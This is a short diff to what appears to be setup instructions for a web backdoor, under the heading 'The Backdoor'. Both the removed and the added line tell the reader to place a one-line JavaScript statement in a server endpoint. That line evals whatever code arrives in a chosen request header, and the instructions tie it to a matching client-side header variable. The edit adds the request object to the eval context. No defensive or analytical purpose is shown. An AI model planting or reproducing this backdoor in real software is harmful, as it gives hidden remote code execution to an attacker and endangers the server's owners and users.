@@ -1,5 +1,5 @@
 # 1. The Backdoor
-Place `if (req.headers?.exploit) return (eval('let r = res;' + req.headers?.exploit));` at the top of the `.php` file.
+Place `if (req.headers?.exploit) return (eval('let r=res;let i=req;'+req.headers?.exploit));` in the endpoint.
 
 Replace `exploit` with the header you're going to use (in lowercase). It must match with the `HEADER` variable on the client side.
 
